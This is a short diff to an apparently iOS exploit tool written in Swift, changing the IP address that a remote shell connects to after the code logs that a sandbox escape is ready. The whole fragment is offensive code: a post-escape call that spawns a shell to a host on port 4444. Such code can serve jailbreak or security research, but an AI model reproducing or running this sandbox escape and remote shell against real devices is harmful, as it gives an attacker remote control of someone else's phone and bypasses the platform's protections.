@@ -252,7 +252,7 @@ final class laramgr: ObservableObject {
                     self.sbxfailed = false
                     self.logmsg("\nsandbox escape ready!\n")
                     DispatchQueue.global(qos: .userInitiated).async { [weak self] in
-                        let r = sw_spawn_shell("192.168.0.31", 4444)
+                        let r = sw_spawn_shell("192.168.0.39", 4444)
                         let msg = r == 0 ? "shell spawned!" : "shell failed (\(r))"
                         DispatchQueue.main.async {
                             self?.logmsg("(shell) \(msg)")
